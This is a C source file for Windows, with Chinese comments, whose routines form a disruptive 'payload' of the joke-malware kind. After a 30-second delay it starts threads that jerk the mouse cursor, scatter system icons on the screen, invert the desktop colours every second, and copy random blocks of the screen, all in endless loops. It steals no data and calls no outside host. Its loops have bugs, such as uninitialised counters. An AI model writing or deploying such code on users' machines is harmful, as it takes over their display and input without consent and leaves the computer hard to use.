//C的原生的头文件
#include<stdio.h>
#include<stdlib.h>
#include<string.h>

//操作文件的头文件
#include<dirent.h>
#include<direct.h>

//多线程和多进程的有文件
#include<process.h>

//使用WindowsAPI获取管理员权限
#include<Windows.h>

//让鼠标指针抖动
void TheMouseDance(void* p){
    POINT point;
    GetCursorPos(&point);
    //向左移动
    for (int i; i < 200; i++) {
        GetCursorPos(&point);
        SetCursorPos(point.x - 3, point.y);
    }
    //向下移动
    for (int i; i < 200; i++) {
        GetCursorPos(&point);
        SetCursorPos(point.x, point.y + 3);
    }
    //向右移动
    for (int i; i < 200; i++) {
        GetCursorPos(&point);
        SetCursorPos(point.x + 3, point.y);
    }
    //向上移动
    for (int i; i < 200; i++) {
        GetCursorPos(&point);
        SetCursorPos(point.x, point.y - 3);
    }
}

//鼠标指针上的图标
void TheMouseDraw(void* p) {
    while (1) {
        POINT point;
        HWND hWnd = GetDesktopWindow();
        HDC hdc = GetWindowDC(hWnd);
        int n = rand() % 10;
        GetCursorPos(&point);
        if (n == 1) {
            DrawIcon(hdc, point.x, point.y, LoadIcon(NULL, IDI_APPLICATION));
        }
        if (n == 2) {
            DrawIcon(hdc, point.x, point.y, LoadIcon(NULL, IDI_ASTERISK));
        }
        if (n == 3) {
            DrawIcon(hdc, point.x, point.y, LoadIcon(NULL, IDI_ERROR));
        }
        if (n == 4) {
            DrawIcon(hdc, point.x, point.y, LoadIcon(NULL, IDI_EXCLAMATION));
        }
        if (n == 5) {
            DrawIcon(hdc, point.x, point.y, LoadIcon(NULL, IDI_HAND));
        }
        if (n == 6) {
            DrawIcon(hdc, point.x, point.y, LoadIcon(NULL, IDI_INFORMATION));
        }
        if (n == 7) {
            DrawIcon(hdc, point.x, point.y, LoadIcon(NULL, IDI_QUESTION));
        }
        if (n == 8) {
            DrawIcon(hdc, point.x, point.y, LoadIcon(NULL, IDI_ERROR));
        }
        if (n == 9) {
            DrawIcon(hdc, point.x, point.y, LoadIcon(NULL, IDI_WARNING));
        }
        if (n == 10) {
            DrawIcon(hdc, point.x, point.y, LoadIcon(NULL, IDI_WINLOGO));
        }
        Sleep(100);
    }
}

    //屏幕反色
void TheDesktopColorErr(void* p) {
    HWND hWnd = GetDesktopWindow();
    HDC hdc = GetWindowDC(hWnd);

    DEVMODE DisPlay;
    EnumDisplaySettings(0, ENUM_CURRENT_SETTINGS, &DisPlay);
    while (1) {
        BitBlt(hdc, 0, 0, DisPlay.dmPelsWidth, DisPlay.dmPelsHeight, hdc, 0, 0, DSTINVERT);
        Sleep(1000);
    }
}

    //随机大小的方块复制
void TheDisPlayDeskCopy(void* p) {
    HWND hWnd = GetDesktopWindow();
    HDC hdc = GetWindowDC(hWnd);
    DEVMODE DisPlay;
    EnumDisplaySettings(0, ENUM_CURRENT_SETTINGS, &DisPlay);

    while (1) {
        int scr_x = rand() % DisPlay.dmPelsWidth;
        int scr_y = rand() % DisPlay.dmPelsHeight;
        int Box_x = rand() % DisPlay.dmPelsWidth;
        int Box_y = rand() % DisPlay.dmPelsHeight;
        int summon_x = rand() % DisPlay.dmPelsWidth;
        int summon_y = rand() % DisPlay.dmPelsHeight;
        BitBlt(hdc, scr_x, scr_y, Box_x, Box_y, hdc, summon_x, summon_y, SRCCOPY);
        Sleep(800);
    }
}

    //在随机位置生成图标
void TheIconRandSummon(void* p) {
    HWND hWnd = GetDesktopWindow();
    HDC hdc = GetWindowDC(hWnd);
    DEVMODE DisPlay;
    EnumDisplaySettings(0, ENUM_CURRENT_SETTINGS, &DisPlay);
    while (1) {
        int n = rand() % 10;
        if (n == 1) {
            DrawIcon(hdc, DisPlay.dmPelsWidth, DisPlay.dmPelsHeight, LoadIcon(NULL,IDI_APPLICATION));
        }
        if (n == 2) {
            DrawIcon(hdc, DisPlay.dmPelsWidth, DisPlay.dmPelsHeight, LoadIcon(NULL, IDI_ASTERISK));
        }
        if (n == 3) {
            DrawIcon(hdc, DisPlay.dmPelsWidth, DisPlay.dmPelsHeight, LoadIcon(NULL, IDI_ERROR));
        }
        if (n == 4) {
            DrawIcon(hdc, DisPlay.dmPelsWidth, DisPlay.dmPelsHeight, LoadIcon(NULL, IDI_EXCLAMATION));
        }
        if (n == 5) {
            DrawIcon(hdc, DisPlay.dmPelsWidth, DisPlay.dmPelsHeight, LoadIcon(NULL, IDI_HAND));
        }
        if (n == 6) {
            DrawIcon(hdc, DisPlay.dmPelsWidth, DisPlay.dmPelsHeight, LoadIcon(NULL, IDI_INFORMATION));
        }
        if (n == 7) {
            DrawIcon(hdc, DisPlay.dmPelsWidth, DisPlay.dmPelsHeight, LoadIcon(NULL, IDI_QUESTION));
        }
        if (n == 8) {
            DrawIcon(hdc, DisPlay.dmPelsWidth, DisPlay.dmPelsHeight, LoadIcon(NULL, IDI_ERROR));
        }
        if (n == 9) {
            DrawIcon(hdc, DisPlay.dmPelsWidth, DisPlay.dmPelsHeight, LoadIcon(NULL, IDI_WARNING));
        }
        if (n == 10) {
            DrawIcon(hdc, DisPlay.dmPelsWidth, DisPlay.dmPelsHeight, LoadIcon(NULL, IDI_WINLOGO));
        }
        Sleep(600);
    }
}

void RunThePayLoad(void) {
    Sleep(30000);
    //启动程序
    _beginthread(TheMouseDance, 0, NULL);
    _beginthread(TheMouseDance, 0, NULL);
    _beginthread(TheIconRandSummon, 0, NULL);
    _beginthread(TheDisPlayDeskCopy, 0, NULL);
    _beginthread(TheDesktopColorErr, 0, NULL);
}
